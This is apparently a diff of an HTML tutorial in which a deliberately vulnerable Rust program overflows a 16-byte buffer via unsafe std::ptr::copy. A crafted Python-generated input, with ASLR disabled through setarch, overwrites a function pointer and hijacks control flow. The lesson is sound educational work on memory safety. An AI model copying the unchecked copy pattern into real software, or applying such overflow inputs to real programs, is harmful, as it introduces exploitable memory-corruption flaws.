@@ -79,87 +79,117 @@
 <a class="sourceLine" id="cb3-3" title="3">    buffer: <span class="op">[</span><span class="dt">u8</span>; <span class="dv">16</span><span class="op">]</span>,</a>
 <a class="sourceLine" id="cb3-4" title="4">    point: *<span class="kw">const</span> <span class="kw">fn</span>(),</a>
 <a class="sourceLine" id="cb3-5" title="5"><span class="op">}</span></a></code></pre></div>
-<p>We’ll also need some unsafe function, to copy bytes without checking the size of the destination buffer. This can be done with <code>std::ptr::copy()</code>.</p>
+<p>We’ll also need some unsafe function, to copy bytes without checking the size of the destination buffer. This can be done with <code>std::ptr::copy()</code>:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode rust"><code class="sourceCode rust"><a class="sourceLine" id="cb4-1" title="1"><span class="kw">unsafe</span> <span class="op">{</span></a>
+<a class="sourceLine" id="cb4-2" title="2">    <span class="pp">std::ptr::</span>copy(</a>
+<a class="sourceLine" id="cb4-3" title="3">        input_bytes.as_ptr(),</a>
+<a class="sourceLine" id="cb4-4" title="4">        hackvist.buffer.as_mut_ptr(),</a>
+<a class="sourceLine" id="cb4-5" title="5">        input_bytes.len(),</a>
+<a class="sourceLine" id="cb4-6" title="6">    )</a>
+<a class="sourceLine" id="cb4-7" title="7"><span class="op">}</span></a></code></pre></div>
 <p>At the end, to make our life easier, we’ll add printing of <code>abracadabra()</code> function address, as well as, the content of <code>hackvist.point</code>, so we can find out what should we provide as an input to call <code>abracadabra()</code>:</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode rust"><code class="sourceCode rust"><a class="sourceLine" id="cb4-1" title="1"><span class="pp">println!</span>(<span class="st">&quot;abracadabra function address: x{:0x}&quot;</span>, abracadabra <span class="kw">as</span> <span class="dt">usize</span>);</a>
-<a class="sourceLine" id="cb4-2" title="2"><span class="pp">println!</span>(<span class="st">&quot;hackvist.point after strcpy: x{:0x}&quot;</span>, hackvist.point <span class="kw">as</span> <span class="dt">usize</span>);</a>
-<a class="sourceLine" id="cb4-3" title="3"><span class="pp">println!</span>(<span class="st">&quot;hackvist.point after strcpy (in chars): {:?}&quot;</span>, (hackvist.point <span class="kw">as</span> <span class="dt">usize</span> <span class="kw">as</span> <span class="dt">u64</span>).to_le_bytes().into_iter().map(|b| <span class="dt">char</span>::from(b)).<span class="pp">collect::</span>&lt;<span class="dt">String</span>&gt;());</a></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode rust"><code class="sourceCode rust"><a class="sourceLine" id="cb5-1" title="1"><span class="pp">println!</span>(<span class="st">&quot;abracadabra function address: x{:0x}&quot;</span>, abracadabra <span class="kw">as</span> <span class="dt">usize</span>);</a>
+<a class="sourceLine" id="cb5-2" title="2"><span class="pp">println!</span>(</a>
+<a class="sourceLine" id="cb5-3" title="3">    <span class="st">&quot;hackvist.point after strcpy: x{:0x}&quot;</span>,</a>
+<a class="sourceLine" id="cb5-4" title="4">    hackvist.point <span class="kw">as</span> <span class="dt">usize</span> </a>
+<a class="sourceLine" id="cb5-5" title="5">);</a>
+<a class="sourceLine" id="cb5-6" title="6"><span class="pp">println!</span>(</a>
+<a class="sourceLine" id="cb5-7" title="7">    <span class="st">&quot;hackvist.point after strcpy (in chars): {:?}&quot;</span>,</a>
+<a class="sourceLine" id="cb5-8" title="8">    (hackvist.point <span class="kw">as</span> <span class="dt">usize</span> <span class="kw">as</span> <span class="dt">u64</span>)</a>
+<a class="sourceLine" id="cb5-9" title="9">        .to_le_bytes()</a>
+<a class="sourceLine" id="cb5-10" title="10">        .into_iter()</a>
+<a class="sourceLine" id="cb5-11" title="11">        .map(|b| <span class="dt">char</span>::from(b))</a>
+<a class="sourceLine" id="cb5-12" title="12">        .<span class="pp">collect::</span>&lt;<span class="dt">String</span>&gt;()</a>
+<a class="sourceLine" id="cb5-13" title="13">);</a></code></pre></div>
 <p>Taken all of this together, this is the source code for this buffer overflow exercise:</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode rust"><code class="sourceCode rust"><a class="sourceLine" id="cb5-1" title="1"><span class="kw">use</span> <span class="pp">std::</span>env;</a>
-<a class="sourceLine" id="cb5-2" title="2"><span class="kw">use</span> <span class="pp">std::ffi::</span>OsString;</a>
-<a class="sourceLine" id="cb5-3" title="3"><span class="kw">use</span> <span class="pp">std::os::unix::ffi::</span>OsStrExt;</a>
-<a class="sourceLine" id="cb5-4" title="4"></a>
-<a class="sourceLine" id="cb5-5" title="5"><span class="kw">fn</span> abracadabra() <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-6" title="6">    <span class="pp">println!</span>(<span class="st">&quot;Abracadabra! Function called!&quot;</span>);</a>
-<a class="sourceLine" id="cb5-7" title="7"><span class="op">}</span></a>
-<a class="sourceLine" id="cb5-8" title="8"></a>
-<a class="sourceLine" id="cb5-9" title="9"><span class="at">#[</span>repr<span class="at">(</span>C<span class="at">)]</span></a>
-<a class="sourceLine" id="cb5-10" title="10"><span class="kw">struct</span> Hackvist <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-11" title="11">    buffer: <span class="op">[</span><span class="dt">u8</span>; <span class="dv">16</span><span class="op">]</span>,</a>
-<a class="sourceLine" id="cb5-12" title="12">    point: *<span class="kw">const</span> <span class="kw">fn</span>(),</a>
-<a class="sourceLine" id="cb5-13" title="13"><span class="op">}</span></a>
-<a class="sourceLine" id="cb5-14" title="14"></a>
-<a class="sourceLine" id="cb5-15" title="15"><span class="kw">fn</span> main() <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-16" title="16">    <span class="kw">let</span> <span class="kw">mut</span> args: <span class="dt">Vec</span>&lt;OsString&gt; = <span class="pp">env::</span>args_os().into_iter().collect();</a>
-<a class="sourceLine" id="cb5-17" title="17">    <span class="kw">let</span> first_arg: OsString = args.remove(<span class="dv">1</span>);</a>
-<a class="sourceLine" id="cb5-18" title="18">    <span class="kw">let</span> input_bytes: &amp;<span class="op">[</span><span class="dt">u8</span><span class="op">]</span> = first_arg.as_bytes();</a>
-<a class="sourceLine" id="cb5-19" title="19">    <span class="kw">let</span> <span class="kw">mut</span> hackvist = Hackvist <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-20" title="20">        buffer: <span class="op">[</span><span class="dv">0</span>; <span class="dv">16</span><span class="op">]</span>,</a>
-<a class="sourceLine" id="cb5-21" title="21">        point: <span class="dv">0</span> <span class="kw">as</span> *<span class="kw">const</span> <span class="kw">fn</span>() -&gt; (),</a>
-<a class="sourceLine" id="cb5-22" title="22">    <span class="op">}</span>;</a>
-<a class="sourceLine" id="cb5-23" title="23"></a>
-<a class="sourceLine" id="cb5-24" title="24">    <span class="kw">unsafe</span> <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-25" title="25">        <span class="pp">std::ptr::</span>copy(input_bytes.as_ptr(), hackvist.buffer.as_mut_ptr(), input_bytes.len())</a>
-<a class="sourceLine" id="cb5-26" title="26">    <span class="op">}</span></a>
-<a class="sourceLine" id="cb5-27" title="27"></a>
-<a class="sourceLine" id="cb5-28" title="28">    <span class="pp">println!</span>(<span class="st">&quot;abracadabra function address: x{:0x}&quot;</span>, abracadabra <span class="kw">as</span> <span class="dt">usize</span>);</a>
-<a class="sourceLine" id="cb5-29" title="29">    <span class="pp">println!</span>(<span class="st">&quot;hackvist.point after strcpy: x{:0x}&quot;</span>, hackvist.point <span class="kw">as</span> <span class="dt">usize</span>);</a>
-<a class="sourceLine" id="cb5-30" title="30">    <span class="pp">println!</span>(<span class="st">&quot;hackvist.point after strcpy (in chars): {:?}&quot;</span>, (hackvist.point <span class="kw">as</span> <span class="dt">usize</span> <span class="kw">as</span> <span class="dt">u64</span>).to_le_bytes().into_iter().map(|b| <span class="dt">char</span>::from(b)).<span class="pp">collect::</span>&lt;<span class="dt">String</span>&gt;());</a>
-<a class="sourceLine" id="cb5-31" title="31"></a>
-<a class="sourceLine" id="cb5-32" title="32">    <span class="kw">if</span> hackvist.point <span class="kw">as</span> <span class="dt">usize</span> == <span class="dv">0</span> <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-33" title="33">        <span class="pp">println!</span>(<span class="st">&quot;Try again&quot;</span>);</a>
-<a class="sourceLine" id="cb5-34" title="34">    <span class="op">}</span> <span class="kw">else</span> <span class="op">{</span></a>
-<a class="sourceLine" id="cb5-35" title="35">        <span class="kw">let</span> code: <span class="kw">fn</span>() = <span class="kw">unsafe</span> <span class="op">{</span> <span class="pp">std::mem::</span>transmute(hackvist.point) <span class="op">}</span>;</a>
-<a class="sourceLine" id="cb5-36" title="36">        code();</a>
-<a class="sourceLine" id="cb5-37" title="37">    <span class="op">}</span></a>
-<a class="sourceLine" id="cb5-38" title="38"><span class="op">}</span></a></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode rust"><code class="sourceCode rust"><a class="sourceLine" id="cb6-1" title="1"><span class="kw">use</span> <span class="pp">std::</span>env;</a>
+<a class="sourceLine" id="cb6-2" title="2"><span class="kw">use</span> <span class="pp">std::ffi::</span>OsString;</a>
+<a class="sourceLine" id="cb6-3" title="3"><span class="kw">use</span> <span class="pp">std::os::unix::ffi::</span>OsStrExt;</a>
+<a class="sourceLine" id="cb6-4" title="4"></a>
+<a class="sourceLine" id="cb6-5" title="5"><span class="kw">fn</span> abracadabra() <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-6" title="6">    <span class="pp">println!</span>(<span class="st">&quot;Abracadabra! Function called!&quot;</span>);</a>
+<a class="sourceLine" id="cb6-7" title="7"><span class="op">}</span></a>
+<a class="sourceLine" id="cb6-8" title="8"></a>
+<a class="sourceLine" id="cb6-9" title="9"><span class="at">#[</span>repr<span class="at">(</span>C<span class="at">)]</span></a>
+<a class="sourceLine" id="cb6-10" title="10"><span class="kw">struct</span> Hackvist <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-11" title="11">    buffer: <span class="op">[</span><span class="dt">u8</span>; <span class="dv">16</span><span class="op">]</span>,</a>
+<a class="sourceLine" id="cb6-12" title="12">    point: *<span class="kw">const</span> <span class="kw">fn</span>(),</a>
+<a class="sourceLine" id="cb6-13" title="13"><span class="op">}</span></a>
+<a class="sourceLine" id="cb6-14" title="14"></a>
+<a class="sourceLine" id="cb6-15" title="15"><span class="kw">fn</span> main() <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-16" title="16">    <span class="kw">let</span> <span class="kw">mut</span> args: <span class="dt">Vec</span>&lt;OsString&gt; = <span class="pp">env::</span>args_os().into_iter().collect();</a>
+<a class="sourceLine" id="cb6-17" title="17">    <span class="kw">let</span> first_arg: OsString = args.remove(<span class="dv">1</span>);</a>
+<a class="sourceLine" id="cb6-18" title="18">    <span class="kw">let</span> input_bytes: &amp;<span class="op">[</span><span class="dt">u8</span><span class="op">]</span> = first_arg.as_bytes();</a>
+<a class="sourceLine" id="cb6-19" title="19">    <span class="kw">let</span> <span class="kw">mut</span> hackvist = Hackvist <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-20" title="20">        buffer: <span class="op">[</span><span class="dv">0</span>; <span class="dv">16</span><span class="op">]</span>,</a>
+<a class="sourceLine" id="cb6-21" title="21">        point: <span class="dv">0</span> <span class="kw">as</span> *<span class="kw">const</span> <span class="kw">fn</span>() -&gt; (),</a>
+<a class="sourceLine" id="cb6-22" title="22">    <span class="op">}</span>;</a>
+<a class="sourceLine" id="cb6-23" title="23">    </a>
+<a class="sourceLine" id="cb6-24" title="24">    <span class="kw">unsafe</span> <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-25" title="25">        <span class="pp">std::ptr::</span>copy(</a>
+<a class="sourceLine" id="cb6-26" title="26">            input_bytes.as_ptr(),</a>
+<a class="sourceLine" id="cb6-27" title="27">            hackvist.buffer.as_mut_ptr(),</a>
+<a class="sourceLine" id="cb6-28" title="28">            input_bytes.len(),</a>
+<a class="sourceLine" id="cb6-29" title="29">        )</a>
+<a class="sourceLine" id="cb6-30" title="30">    <span class="op">}</span></a>
+<a class="sourceLine" id="cb6-31" title="31">    </a>
+<a class="sourceLine" id="cb6-32" title="32">    <span class="pp">println!</span>(<span class="st">&quot;abracadabra function address: x{:0x}&quot;</span>, abracadabra <span class="kw">as</span> <span class="dt">usize</span>);</a>
+<a class="sourceLine" id="cb6-33" title="33">    <span class="pp">println!</span>(</a>
+<a class="sourceLine" id="cb6-34" title="34">        <span class="st">&quot;hackvist.point after strcpy: x{:0x}&quot;</span>,</a>
+<a class="sourceLine" id="cb6-35" title="35">        hackvist.point <span class="kw">as</span> <span class="dt">usize</span> </a>
+<a class="sourceLine" id="cb6-36" title="36">    );</a>
+<a class="sourceLine" id="cb6-37" title="37">    <span class="pp">println!</span>(</a>
+<a class="sourceLine" id="cb6-38" title="38">        <span class="st">&quot;hackvist.point after strcpy (in chars): {:?}&quot;</span>,</a>
+<a class="sourceLine" id="cb6-39" title="39">        (hackvist.point <span class="kw">as</span> <span class="dt">usize</span> <span class="kw">as</span> <span class="dt">u64</span>)</a>
+<a class="sourceLine" id="cb6-40" title="40">            .to_le_bytes()</a>
+<a class="sourceLine" id="cb6-41" title="41">            .into_iter()</a>
+<a class="sourceLine" id="cb6-42" title="42">            .map(|b| <span class="dt">char</span>::from(b))</a>
+<a class="sourceLine" id="cb6-43" title="43">            .<span class="pp">collect::</span>&lt;<span class="dt">String</span>&gt;()</a>
+<a class="sourceLine" id="cb6-44" title="44">    );</a>
+<a class="sourceLine" id="cb6-45" title="45"></a>
+<a class="sourceLine" id="cb6-46" title="46">    <span class="kw">if</span> hackvist.point <span class="kw">as</span> <span class="dt">usize</span> == <span class="dv">0</span> <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-47" title="47">        <span class="pp">println!</span>(<span class="st">&quot;Try again&quot;</span>);</a>
+<a class="sourceLine" id="cb6-48" title="48">    <span class="op">}</span> <span class="kw">else</span> <span class="op">{</span></a>
+<a class="sourceLine" id="cb6-49" title="49">        <span class="kw">let</span> code: <span class="kw">fn</span>() = <span class="kw">unsafe</span> <span class="op">{</span> <span class="pp">std::mem::</span>transmute(hackvist.point) <span class="op">}</span>;</a>
+<a class="sourceLine" id="cb6-50" title="50">        code();</a>
+<a class="sourceLine" id="cb6-51" title="51">    <span class="op">}</span></a>
+<a class="sourceLine" id="cb6-52" title="52"><span class="op">}</span></a></code></pre></div>
 <h2 id="running-it">4. Running it!</h2>
 <p>Now, let’s try to build it:</p>
-<pre><code>$ cargo build</code></pre>
+<pre><code>$ rustc --edition 2021 buffer-overflow.rs</code></pre>
 <p>And run (the values can differ on your computer):</p>
-<pre><code>$ ./target/debug/buffer-overflow &quot;AAAABBBB&quot;
-abracadabra function address: x5597c4265bb0
+<pre><code>$ ./buffer-overflow &quot;AAAABBBB&quot;
+abracadabra function address: x5595670e21d0
 hackvist.point after strcpy: x0
 hackvist.point after strcpy (in chars): &quot;\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}&quot;
 Try again</code></pre>
 <p>This time the input string was too short <code>AAAABBBB</code> has only 8 bytes, so it wasn’t enough to overflow our 16 byte buffer and write into <code>hackvist.point</code> function pointer. Let’s try with longer input:</p>
-<pre><code>$ ./target/debug/buffer-overflow &quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH&quot;
-abracadabra function address: x55e1e06cbbb0
+<pre><code>$ ./buffer-overflow &quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH&quot;
+abracadabra function address: x55a4246391d0
 hackvist.point after strcpy: x4646464645454545
 hackvist.point after strcpy (in chars): &quot;EEEEFFFF&quot;
 Segmentation fault (core dumped)</code></pre>
 <p>As we can see, we managed to overflow the buffer and write into the function pointer. It wasn’t correctly set, so there was a segmentation fault.</p>
 <p>Right now we’ll want to change letters <code>EEEEFFFF</code> in the input string into <code>abracadabra()</code> function address. Let’s try:</p>
-<pre><code>$ ./target/debug/buffer-overflow \
-&gt; $(python -c 'print &quot;AAAABBBBCCCCDDDD\xb0\xbb\x6c\xe0\xe1\x55&quot;')
-abracadabra function address: x55d7609eabb0
-hackvist.point after strcpy: x55e1e06cbbb0
-hackvist.point after strcpy (in chars): &quot;°»làáU\u{0}\u{0}&quot;
+<pre><code>$ ./buffer-overflow $(python -c 'print &quot;AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55&quot;')
+abracadabra function address: x55f9ece391d0
+hackvist.point after strcpy: x55a4246391d0
+hackvist.point after strcpy (in chars): &quot;Ð\u{91}c$¤U\u{0}\u{0}&quot;
 Segmentation fault (core dumped)</code></pre>
-<p>It didn’t work, even though the <code>hackvist.point</code> was “correctly” overwritten with <code>x55e1e06cbbb0</code>, which is exactly the <code>abracadabra()</code> function address from our previous run: <code>x55e1e06cbbb0</code>.</p>
+<p>It didn’t work, even though the <code>hackvist.point</code> was “correctly” overwritten with <code>x55a4246391d0</code>, which is exactly the <code>abracadabra()</code> function address from our previous run: <code>x55a4246391d0</code>.</p>
 <p>The reason for this is that on my machine, <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">address space layout randomization</a> is used to make buffer overflow attacks harder. This can be turned off by running the binary with:</p>
-<pre><code>$ setarch x86_64 -R ./target/debug/buffer-overflow \
-&gt; $(python -c 'print &quot;AAAABBBBCCCCDDDD\xb0\xbb\x6c\xe0\xe1\x55&quot;')
-abracadabra function address: x55555555cbb0
-hackvist.point after strcpy: x55e1e06cbbb0
-hackvist.point after strcpy (in chars): &quot;°»làáU\u{0}\u{0}&quot;
+<pre><code>$ setarch x86_64 -R ./buffer-overflow \
+&gt; $(python -c 'print &quot;AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55&quot;')
+abracadabra function address: x55555555e1d0
+hackvist.point after strcpy: x55a4246391d0
+hackvist.point after strcpy (in chars): &quot;Ð\u{91}c$¤U\u{0}\u{0}&quot;
 Segmentation fault (core dumped)</code></pre>
-<p>This time the address has changed once again, but from now on, the <code>abracadabra()</code> function address shouldn’t change, so we can use <code>x55555555cbb0</code> address in our input:</p>
-<pre><code>$ setarch x86_64 -R ./target/debug/buffer-overflow \
-&gt; $(python -c 'print &quot;AAAABBBBCCCCDDDD\xb0\xcb\x55\x55\x55\x55&quot;')
-abracadabra function address: x55555555cbb0
-hackvist.point after strcpy: x55555555cbb0
-hackvist.point after strcpy (in chars): &quot;°ËUUUU\u{0}\u{0}&quot;
+<p>This time the address has changed once again, but from now on, the <code>abracadabra()</code> function address shouldn’t change, so we can use <code>x55555555e1d0</code> address in our input:</p>
+<pre><code>$ setarch x86_64 -R ./buffer-overflow \
+&gt; $(python -c 'print &quot;AAAABBBBCCCCDDDD\xd0\xe1\x55\x55\x55\x55&quot;')
+abracadabra function address: x55555555e1d0
+hackvist.point after strcpy: x55555555e1d0
+hackvist.point after strcpy (in chars): &quot;ÐáUUUU\u{0}\u{0}&quot;
 Abracadabra! Function called!</code></pre>
 <p>Success! Buffer overflow has overwritten the <code>hackvist.point</code> pointer with a valid function address and we have changed the program behaviour with our sneaky input :)</p>
     </section>
